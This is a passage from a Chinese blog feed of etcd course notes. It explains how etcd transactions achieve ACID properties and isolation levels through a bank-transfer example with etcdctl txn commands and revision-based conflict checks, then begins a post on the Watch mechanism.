Server、Raft模块处理后，在Apply模块执行此事务的时候，它首先对你的事务的If语句进行检查，也就是ApplyCompares操作，如果通过此操作，则执行ApplyTxn&#x2F;Then语句，否则执行ApplyTxn&#x2F;Else语句。</p><p>在执行以上操作过程中，它会根据事务是否只读、可写，通过MVCC层的读写事务对象，执行事务中的get&#x2F;put&#x2F;delete各操作，也就是我们上一节课介绍的MVCC对key的读写原理。</p><h2 id="事务ACID特性"><a href="#事务ACID特性" class="headerlink" title="事务ACID特性"></a>事务ACID特性</h2><p>了解完事务的整体执行流程后，那么etcd应该如何正确实现上面案例中Alice向Bob转账的事务呢？别着急，我们先来了解一下事务的ACID特性。在你了解了etcd事务ACID特性实现后，这个转账事务案例的正确解决方案也就简单了。</p><p>ACID是衡量事务的四个特性，由原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）、持久性（Durability）组成。接下来我就为你分析ACID特性在etcd中的实现。</p><h3 id="原子性与持久性"><a href="#原子性与持久性" class="headerlink" title="原子性与持久性"></a>原子性与持久性</h3><p>事务的原子性（Atomicity）是指在一个事务中，所有请求要么同时成功，要么同时失败。比如在我们的转账案例中，是绝对无法容忍Alice账号扣款成功，但是Bob账号资金到账失败的场景。</p><p>持久性（Durability）是指事务一旦提交，其所做的修改会永久保存在数据库。</p><p>软件系统在运行过程中会遇到各种各样的软硬件故障，如果etcd在执行上面事务过程中，刚执行完扣款命令（put Alice 100）就突然crash了，它是如何保证转账事务的原子性与持久性的呢？</p><p><img src="https://static001.geekbang.org/resource/image/cf/9e/cf94ce8fc0649fe5cce45f8b7468019e.png?wh=1920*949" alt="img"></p><p>如上图转账事务流程图所示，etcd在执行一个事务过程中，任何时间点都可能会出现节点crash等异常问题。我在图中给你标注了两个关键的异常时间点，它们分别是T1和T2。接下来我分别为你分析一下etcd在这两个关键时间点异常后，是如何保证事务的原子性和持久性的。</p><h4 id="T1时间点"><a href="#T1时间点" class="headerlink" title="T1时间点"></a>T1时间点</h4><p>T1时间点是在Alice账号扣款100元完成时，Bob账号资金还未成功增加时突然发生了crash。</p><p>从前面介绍的etcd写原理和上面流程图我们可知，此时MVCC写事务持有boltdb写锁，仅是将修改提交到了内存中，保证幂等性、防止日志条目重复执行的一致性索引consistent index也并未更新。同时，负责boltdb事务提交的goroutine因无法持有写锁，也并未将事务提交到持久化存储中。</p><p>因此，T1时间点发生crash异常后，事务并未成功执行和持久化任意数据到磁盘上。在节点重启时，etcd server会重放WAL中的已提交日志条目，再次执行以上转账事务。因此不会出现Alice扣款成功、Bob到帐失败等严重Bug，极大简化了业务的编程复杂度。</p><h4 id="T2时间点"><a href="#T2时间点" class="headerlink" title="T2时间点"></a>T2时间点</h4><p>T2时间点是在MVCC写事务完成转账，server返回给client转账成功后，boltdb的事务提交goroutine，批量将事务持久化到磁盘中时发生了crash。这时etcd又是如何保证原子性和持久性的呢?</p><p>我们知道一致性索引consistent index字段值是和key-value数据在一个boltdb事务里同时持久化到磁盘中的。若在boltdb事务提交过程中发生crash了，简单情况是consistent index和key-value数据都更新失败。那么当节点重启，etcd server重放WAL中已提交日志条目时，同样会再次应用转账事务到状态机中，因此事务的原子性和持久化依然能得到保证。</p><p>更复杂的情况是，当boltdb提交事务的时候，会不会部分数据提交成功，部分数据提交失败呢？这个问题，我将在下一节课通过深入介绍boltdb为你解答。</p><p>了解完etcd事务的原子性和持久性后，那一致性又是怎么一回事呢？事务的一致性难道是指各个节点数据一致性吗？</p><h3 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h3><p>在软件系统中，到处可见一致性（Consistency）的表述，其实在不同场景下，它的含义是不一样的。</p><p>首先分布式系统中多副本数据一致性，它是指各个副本之间的数据是否一致，比如Redis的主备是异步复制的，那么它的一致性是最终一致性的。</p><p>其次是CAP原理中的一致性是指可线性化。核心原理是虽然整个系统是由多副本组成，但是通过线性化能力支持，对client而言就如一个副本，应用程序无需关心系统有多少个副本。</p><p>然后是一致性哈希，它是一种分布式系统中的数据分片算法，具备良好的分散性、平衡性。</p><p>最后是事务中的一致性，它是指事务变更前后，数据库必须满足若干恒等条件的状态约束， <strong>一致性往往是由数据库和业务程序两方面来保障的</strong>。</p><p><strong>在Alice向Bob转账的案例中有哪些恒等状态呢？</strong></p><p>很明显，转账系统内的各账号资金总额，在转账前后应该一致，同时各账号资产不能小于0。</p><p>为了帮助你更好地理解前面转账事务实现的问题，下面画了幅两个并发转账事务的流程图。</p><p>图中有两个并发的转账事务，Mike向Bob转账100元，Alice也向Bob转账100元，按照我们上面的事务实现，从下图可知转账前系统总资金是600元，转账后却只有500元了，因此它无法保证转账前后账号系统内的资产一致性，导致了资产凭空消失，破坏了事务的一致性。</p><p><img src="https://static001.geekbang.org/resource/image/1f/ea/1ff951756c0ffc427e5a064e3cf8caea.png?wh=1920*1153" alt="img"></p><p>事务一致性被破坏的根本原因是，事务中缺少对Bob账号资产是否发生变化的判断，这就导致账号资金被覆盖。</p><p>为了确保事务的一致性，一方面，业务程序在转账逻辑里面，需检查转账者资产大于等于转账金额。在事务提交时，通过账号资产的版本号，确保双方账号资产未被其他事务修改。若双方账号资产被其他事务修改，账号资产版本号会检查失败，这时业务可以通过获取最新的资产和版本号，发起新的转账事务流程解决。</p><p>另一方面，etcd会通过WAL日志和consistent index、boltdb事务特性，去确保事务的原子性，因此不会有部分成功部分失败的操作，导致资金凭空消失、新增。</p><p>介绍完事务的原子性和持久化、一致性后，我们再看看etcd又是如何提供各种隔离级别的事务，在转账过程中，其他client能看到转账的中间状态吗(如Alice扣款成功，Bob还未增加时)？</p><h3 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h3><p>ACID中的I是指Isolation，也就是事务的隔离性，它是指事务在执行过程中的可见性。常见的事务隔离级别有以下四种。</p><p>首先是 <strong>未提交读</strong>（Read UnCommitted），也就是一个client能读取到未提交的事务。比如转账事务过程中，Alice账号资金扣除后，Bob账号上资金还未增加，这时如果其他client读取到这种中间状态，它会发现系统总金额钱减少了，破坏了事务一致性的约束。</p><p>其次是 <strong>已提交读</strong>（Read Committed），指的是只能读取到已经提交的事务数据，但是存在不可重复读的问题。比如事务开始时，你读取了Alice和Bob资金，这时其他事务修改Alice和Bob账号上的资金，你在事务中再次读取时会读取到最新资金，导致两次读取结果不一样。</p><p>接着是 <strong>可重复读</strong>（Repeated Read），它是指在一个事务中，同一个读操作get Alice&#x2F;Bob在事务的任意时刻都能得到同样的结果，其他修改事务提交后也不会影响你本事务所看到的结果。</p><p>最后是 <strong>串行化</strong>（Serializable），它是最高的事务隔离级别，读写相互阻塞，通过牺牲并发能力、串行化来解决事务并发更新过程中的隔离问题。对于串行化我要和你特别补充一点，很多人认为它都是通过读写锁，来实现事务一个个串行提交的，其实这只是在基于锁的并发控制数据库系统实现而已。 <strong>为了优化性能，在基于MVCC机制实现的各个数据库系统中，提供了一个名为“可串行化的快照隔离”级别，相比悲观锁而言，它是一种乐观并发控制，通过快照技术实现的类似串行化的效果，事务提交时能检查是否冲突。</strong></p><p>下面介绍下未提交读、已提交读、可重复读、串行化快照隔离。</p><h4 id="未提交读"><a href="#未提交读" class="headerlink" title="未提交读"></a>未提交读</h4><p>首先是最低的事务隔离级别，未提交读。我们通过如下一个转账事务时间序列图，来分析下一个client能否读取到未提交事务修改的数据，是否存在脏读。</p><p><img src="https://static001.geekbang.org/resource/image/6a/8d/6a526be4949a383fd5263484c706d68d.png?wh=1920*786" alt="img"></p><p>图中有两个事务，一个是用户查询Alice和Bob资产的事务，一个是执行Alice向Bob转账的事务。</p><p>如图中所示，若在Alice向Bob转账事务执行过程中，etcd server收到了client查询Alice和Bob资产的读请求，显然此时我们无法接受client能读取到一个未提交的事务，因为这对应用程序而言会产生严重的BUG。那么etcd是如何保证不出现这种场景呢？</p><p>我们知道etcd基于boltdb实现读写操作的，读请求由boltdb的读事务处理，你可以理解为快照读。写请求由boltdb写事务处理，etcd定时将一批写操作提交到boltdb并清空buffer。</p><p>由于etcd是批量提交写事务的，而读事务又是快照读，因此当MVCC写事务完成时，它需要更新buffer，这样下一个读请求到达时，才能从buffer中获取到最新数据。</p><p>在我们的场景中，转账事务并未结束，执行put Alice为100的操作不会回写buffer，因此避免了脏读的可能性。用户此刻从boltdb快照读事务中查询到的Alice和Bob资产都为200。</p><p>从以上分析可知，etcd并未使用悲观锁来解决脏读的问题，而是通过MVCC机制来实现读写不阻塞，并解决脏读的问题。</p><h4 id="已提交读、可重复读"><a href="#已提交读、可重复读" class="headerlink" title="已提交读、可重复读"></a>已提交读、可重复读</h4><p>比未提交读隔离级别更高的是已提交读，它是指在事务中能读取到已提交数据，但是存在不可重复读的问题。已提交读，也就是说你每次读操作，若未增加任何版本号限制，默认都是当前读，etcd会返回最新已提交的事务结果给你。</p><p>如何理解不可重复读呢?</p><p>在上面用户查询Alice和Bob事务的案例中，第一次查出来资产都是200，第二次是Alice为100，Bob为300，通过读已提交模式，你能及时获取到etcd最新已提交的事务结果，但是出现了不可重复读，两次读出来的Alice和Bob资产不一致。</p><p>那么如何实现可重复读呢？</p><p>你可以通过MVCC快照读，或者参考etcd的事务框架STM实现，它在事务中维护一个读缓存，优先从读缓存中查找，不存在则从etcd查询并更新到缓存中，这样事务中后续读请求都可从缓存中查找，确保了可重复读。</p><p>最后我们再来重点介绍下什么是串行化快照隔离。</p><h4 id="串行化快照隔离"><a href="#串行化快照隔离" class="headerlink" title="串行化快照隔离"></a>串行化快照隔离</h4><p>串行化快照隔离是最严格的事务隔离级别，它是指在在事务刚开始时，首先获取etcd当前的版本号rev，事务中后续发出的读请求都带上这个版本号rev，告诉etcd你需要获取那个时间点的快照数据，etcd的MVCC机制就能确保事务中能读取到同一时刻的数据。</p><p><strong>同时，它还要确保事务提交时，你读写的数据都是最新的，未被其他人修改，也就是要增加冲突检测机制。</strong> 当事务提交出现冲突的时候依赖client重试解决，安全地实现多key原子更新。</p><p>那么如何为上面一致性案例中，两个并发转账的事务，增加冲突检测机制呢？</p><p>核心就是前面介绍MVCC的版本号，通过下面的并发转账事务流程图解释它是如何工作的。</p><p><img src="https://static001.geekbang.org/resource/image/3b/26/3b4c7fb43e03a38aceb2a8c2d5c92226.png?wh=1920*1011" alt="img"></p><p>如上图所示，事务A，Alice向Bob转账100元，事务B，Mike向Bob转账100元，两个事务同时发起转账操作。</p><p>一开始时，Mike的版本号(指mod_revision)是4，Bob版本号是3，Alice版本号是2，资产各自200。为了防止并发写事务冲突，etcd在一个写事务开始时，会独占一个MVCC读写锁。</p><p>事务A会先去etcd查询当前Alice和Bob的资产版本号，用于在事务提交时做冲突检测。在事务A查询后，事务B获得MVCC写锁并完成转账事务，Mike和Bob账号资产分别为100，300，版本号都为5。</p><p>事务B完成后，事务A获得写锁，开始执行事务。</p><p>为了解决并发事务冲突问题，事务A中增加了冲突检测，期望的Alice版本号应为2，Bob为3。结果事务B的修改导致Bob版本号变成了5，因此此事务会执行失败分支，再次查询Alice和Bob版本号和资产，发起新的转账事务，成功通过MVCC冲突检测规则mod(“Alice”) &#x3D; 2 和 mod(“Bob”) &#x3D; 5 后，更新Alice账号资产为100，Bob资产为400，完成转账操作。</p><p>通过上面介绍的快照读和MVCC冲突检测检测机制，etcd就可实现串行化快照隔离能力。</p><h3 id="转账案例应用"><a href="#转账案例应用" class="headerlink" title="转账案例应用"></a>转账案例应用</h3><p>介绍完etcd事务ACID特性实现后，你很容易发现事务特性初体验中的案例问题了，它缺少了完整事务的冲突检测机制。</p><p>首先你可通过一个事务获取Alice和Bob账号的上资金和版本号，用以判断Alice是否有足够的金额转账给Bob和事务提交时做冲突检测。 你可通过如下etcdctl txn命令，获取Alice和Bob账号的资产和最后一次修改时的版本号(mod_revision):</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs maxima">$ etcdctl txn -i -w=json<br>compares:<br><br>success requests (<span class="hljs-built_in">get</span>, <span class="hljs-built_in">put</span>, <span class="hljs-built_in">del</span>):<br><span class="hljs-built_in">get</span> Alice<br><span class="hljs-built_in">get</span> Bob<br><br>failure requests (<span class="hljs-built_in">get</span>, <span class="hljs-built_in">put</span>, <span class="hljs-built_in">del</span>):<br><br>&#123;<br> <span class="hljs-string">&quot;kvs&quot;</span>:[<br>      &#123;<br>          <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;QWxpY2U=&quot;</span>,<br>          <span class="hljs-string">&quot;create_revision&quot;</span>:<span class="hljs-number">2</span>,<br>          <span class="hljs-string">&quot;mod_revision&quot;</span>:<span class="hljs-number">2</span>,<br>          <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-number">1</span>,<br>          <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;MjAw&quot;</span><br>      &#125;<br>  ],<br>    ......<br>  <span class="hljs-string">&quot;kvs&quot;</span>:[<br>      &#123;<br>          <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;Qm9i&quot;</span>,<br>          <span class="hljs-string">&quot;create_revision&quot;</span>:<span class="hljs-number">3</span>,<br>          <span class="hljs-string">&quot;mod_revision&quot;</span>:<span class="hljs-number">3</span>,<br>          <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-number">1</span>,<br>          <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;MzAw&quot;</span><br>      &#125;<br>  ],<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其次发起资金转账操作，Alice账号减去100，Bob账号增加100。为了保证转账事务的准确性、一致性，提交事务的时候需检查Alice和Bob账号最新修改版本号与读取资金时的一致(compares操作中增加版本号检测)，以保证其他事务未修改两个账号的资金。</p><p>若compares操作通过检查，则执行转账操作，否则执行查询Alice和Bob账号资金操作，命令如下:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ etcdctl txn -i<br>compares:<br>mod(&quot;Alice&quot;) = &quot;2&quot;<br>mod(&quot;Bob&quot;) = &quot;3&quot;<br><br><span class="hljs-keyword">success </span>requests (get, put, del):<br>put Alice 100<br>put Bob 300<br><br><span class="hljs-keyword">failure </span>requests (get, put, del):<br>get Alice<br>get Bob<br><br><span class="hljs-keyword">SUCCESS</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword"></span>OK<br><br>OK<br><br></code></pre></td></tr></table></figure><p>到这里我们就完成了一个安全的转账事务操作，从以上流程中可以发现，自己从0到1实现一个完整的事务还是比较繁琐的，幸运的是，etcd社区基于以上介绍的事务特性，提供了一个简单的事务框架 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/clientv3/concurrency/stm.go">STM</a>，构建了各个事务隔离级别类，帮助你进一步简化应用编程复杂度。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>首先介绍了事务API的基本结构，它由If、Then、Else语句组成。</p><p>其中If支持多个比较规则，它是用于事务提交时的冲突检测，比较的对象支持key的 <strong>mod_revision</strong>、 <strong>create_revision、version、value值</strong>。随后我给你介绍了整个事务执行的基本流程，Apply模块首先执行If的比较规则，为真则执行Then语句，否则执行Else语句。</p><p>接着通过转账案例，四幅转账事务时间序列图，我为你分析了事务的ACID特性，剖析了在etcd中事务的ACID特性的实现。</p><ul><li><p>原子性是指一个事务要么全部成功要么全部失败，etcd基于WAL日志、consistent index、boltdb的事务能力提供支持。</p></li><li><p>一致性是指事务转账前后的，数据库和应用程序期望的恒等状态应该保持不变，这通过数据库和业务应用程序相互协作完成。</p></li><li><p>持久性是指事务提交后，数据不丢失，</p></li><li><p>隔离性是指事务提交过程中的可见性，etcd不存在脏读，基于MVCC机制、boltdb事务你可以实现可重复读、串行化快照隔离级别的事务，保障并发事务场景中你的数据安全性。</p></li></ul><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>在数据库事务中，有各种各样的概念，比如脏读、脏写、不可重复读与读倾斜、幻读与写倾斜、更新丢失、快照隔离、可串行化快照隔离? 你知道它们的含义吗？</p><ul><li>脏读、脏写： 在读未提交的隔离级别的情况下，事务A执行过程中，事务A对数据资源进行了修改，事务B读取了事务A修改后且未提交的数据。A因为某些原因回滚了操作，B却使用了A对资源修改后的数据，进行了读写等操作。</li><li>不可重复读： 在读未提交、读提交的隔离级别情况下，事务B读取了两次数据资源，在这两次读取的过程中事务A修改了数据，导致事务B在这两次读取出来的数据不一致。这种在同一个事务中，前后两次读取的数据不一致的现象就是不可重复读。 </li><li>幻读： 在可重复读得隔离级别情况下，事务B前后两次读取同一个范围的数据，在事务B两次读取的过程中事务A新增了数据，导致事务B后一次读取到前一次查询没有看到的行。 </li><li>读倾斜、写倾斜： 读写倾斜是在数据分表不合理的情况下，对某个表的数据存在大量的读取写入的需求，分表不均衡不合理导致的。 </li><li>更新丢失： 第一类丢失，在读未提交的隔离级别情况下，事务A和事务B都对数据进行更新，但是事务A由于某种原因事务回滚了，把已经提交的事务B的更新数据给覆盖了。这种现象就是第一类更新丢失。 第二类丢失，在可重复读的隔离级别情况下，跟第一类更新丢失有点类似，也是两个事务同时对数据进行更新，但是事务A的更新把已提交的事务B的更新数据给覆盖了。这种现象就是第二类更新丢失。</li><li>快照隔离： 每个事务都从一个数据库的快照中读数据，如果有些数据在当前事务开始之后，被其他事务改变了值，快照隔离能够保证当前事务无法看到这个新值。 可串行化快照隔离： 可串行化快照隔离是在快照隔离级别之上，支持串行化。</li></ul><h3 align=center>快速理解脏读、不可重复读、幻读？**【1】脏读（读取未提交数据）**      A事务读取B事务尚未提交的数据，此时如果B事务发生错误并执行回滚操作，那么A事务读取到的数据就是脏数据。就好像原本的数据比较干净、纯粹，此时由于B事务更改了它，这个数据变得不再纯粹。这个时候A事务立即读取了这个脏数据，但事务B良心发现，又用回滚把数据恢复成原来干净、纯粹的样子，而事务A却什么都不知道，最终结果就是事务A读取了此次的脏数据，称为脏读。<p><strong>这种情况常发生于转账与取款操作中:</strong></p><table><thead><tr><th>时间顺序</th><th>转账事务</th><th>取款事务</th></tr></thead><tbody><tr><td>1</td><td></td><td>开始事务</td></tr><tr><td>2</td><td>开始事务</td><td></td></tr><tr><td>3</td><td></td><td>查询账户余额为2000元</td></tr><tr><td>4</td><td></td><td>取款1000元，余额被更改为1000元</td></tr><tr><td>5</td><td>查询账户余额为1000元产生脏读）</td><td></td></tr><tr><td>6</td><td></td><td>取款操作发生未知错误，事务回滚，余额变更为2000元</td></tr><tr><td>7</td><td>转入2000元，余额被更改为3000元（脏读的1000+2000）</td><td></td></tr><tr><td>8</td><td>提交事务</td><td></td></tr><tr><td>备注</td><td><span style="color:#000000;">按照正确逻辑，此时账户余额应该为4000元</span></td><td></td></tr></tbody></table><p style="text-indent:33px;">事务A在执行读取操作，由整个事务A比较大，前后读取同一条数据需要经历很长的时间 。而在事务A第一次读取数据，比如此时读取了小明的年龄为20岁，事务B执行更改操作，将小明的年龄更改为30岁，此时事务A第二次读取到小明的年龄时，发现其年龄是30岁，和之前的数据不一样了，也就是数据不重复了，系统不可以读取到重复的数据，成为不可重复读。</p><div class="table-box"><table cellspacing="0" style="width:421.55pt;"><tbody><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;">时间顺序</p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">事务A</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">事务B</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">1</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">开始事务</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">2</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">第一次查询，小明的年龄为20岁</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">3</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">开始事务</span></p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">4</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">其他操作</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">5</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">更改小明的年龄为30岁</span></p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">6</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">提交事务</span></p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">7</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">第二次查询，小明的年龄为30岁</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">备注</span></p>            </td>            <td colspan="2" style="width:345.6pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">按照正确逻辑，事务A前后两次读取到的数据应该一致</span></p>            </td>        </tr></tbody></table></div><p><strong>【3】幻读（前后多次读取，数据总量不一致）</strong><br>事务A在执行读取操作，需要两次统计数据的总量，前一次查询数据总量后，此时事务B执行了新增数据的操作并提交后，这个时候事务A读取的数据总量和之前统计的不一样，就像产生了幻觉一样，平白无故的多了几条数据，成为幻读。</p><div class="table-box"><table cellspacing="0" style="width:421.55pt;"><tbody><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;">时间顺序</p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">事务A</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">事务B</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">1</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">开始事务</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">2</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">第一次查询，数据总量为100条</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">3</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">开始事务</span></p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">4</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">其他操作</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">5</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">新增100条数据</span></p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">6</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">提交事务</span></p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">7</span></p>            </td>            <td style="width:175.8pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">第二次查询，数据总量为200条</span></p>            </td>            <td style="width:169.8pt;">            <p style="margin-left:0pt;">&nbsp;</p>            </td>        </tr><tr><td style="width:75.95pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">备注</span></p>            </td>            <td colspan="2" style="width:345.6pt;">            <p style="margin-left:0pt;"><span style="color:#000000;">按照正确逻辑，事务A前后两次读取到的数据总量应该一致</span></p>            </td>        </tr></tbody></table></div><p>理解了脏读、不可重复读、幻读，那么接下来看看事务隔离级别是怎么个回事<a href="https://blog.csdn.net/qq_33591903/article/details/82079302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158632818519726869014448%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158632818519726869014448&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-1">【数据库】事务隔离级别</a></p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>08.Watch：如何高效获取数据变化通知？</title>
    <link href="/2022/10/04/08-Watch%EF%BC%9A%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%E9%80%9A%E7%9F%A5%EF%BC%9F/"/>
    <url>/2022/10/04/08-Watch%EF%BC%9A%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%E9%80%9A%E7%9F%A5%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="08-Watch：如何高效获取数据变化通知？"><a href="#08-Watch：如何高效获取数据变化通知？" class="headerlink" title="08.Watch：如何高效获取数据变化通知？"></a>08.Watch：如何高效获取数据变化通知？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在Kubernetes中，各种各样的控制器实现了Deployment、StatefulSet、Job等功能强大的Workload。控制器的核心思想是监听、比较资源实际状态与期望状态是否一致，若不一致则进行协调工作，使其最终一致。</p><p>那么当修改一个Deployment的镜像时，Deployment控制器是如何高效的感知到期望状态发生了变化呢？</p><p>要回答这个问题，得从etcd的Watch特性说起，它是Kubernetes控制器的工作基础。今天分享的主题就是etcd的核心特性Watch机制设计实现，通过分析Watch机制的四大核心问题，了解一个变化数据是如何从0到1推送给client，并介绍Watch特性从etcd v2到etcd v3演进、优化过程。</p><h2 id="Watch特性初体验"><a href="#Watch特性初体验" class="headerlink" title="Watch特性初体验"></a>Watch特性初体验</h2><p>先通过几个简单命令，带你初体验下Watch特性。</p><p>启动一个空集群，更新两次key hello后，使用Watch特性如何获取key hello的历史修改记录呢？</p><p>如下所示，可以通过下面的watch命令，带版本号监听key hello，集群版本号可通过endpoint status命令获取，空集群启动后的版本号为1。</p><p>执行后输出如下代码所示，两个事件记录分别对应上面的两次的修改，事件中含有key、value、各类版本号等信息，还可以通过比较create_revision和mod_revision区分此事件是add还是update事件。</p><p>watch命令执行后，你后续执行的增量put hello修改操作，它同样可持续输出最新的变更事件给你。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ etcdctl <span class="hljs-keyword">put</span> hello world1<br>$ etcdctl <span class="hljs-keyword">put</span> hello world2<br>$ etcdctl watch 